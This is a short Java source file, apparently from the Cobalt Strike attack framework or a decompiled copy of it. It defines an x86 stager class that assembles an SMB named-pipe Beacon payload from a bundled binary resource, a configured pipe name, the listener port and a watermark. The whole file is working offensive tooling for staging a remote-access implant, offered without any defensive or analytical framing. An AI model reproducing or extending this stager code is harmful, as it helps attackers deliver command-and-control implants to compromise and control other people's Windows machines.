package stagers;

import common.CommonUtils;
import common.Listener;

public class BeaconPipeStagerX86
        extends GenericStager {
    public BeaconPipeStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String arch() {
        return "x86";
    }

    @Override
    public String payload() {
        return "windows/beacon_smb/bind_pipe";
    }

    @Override
    public byte[] generate() {
        String data = CommonUtils.bString(CommonUtils.readResource("resources/smbstager.bin"));
        String pname = CommonUtils.strrep(this.getConfig().getStagerPipe(), "##", this.getListener().getPort() + "");
        data = data + "\\\\.\\pipe\\" + pname + '\u0000' + this.getConfig().getWatermark();
        return CommonUtils.toBytes(data);
    }
}

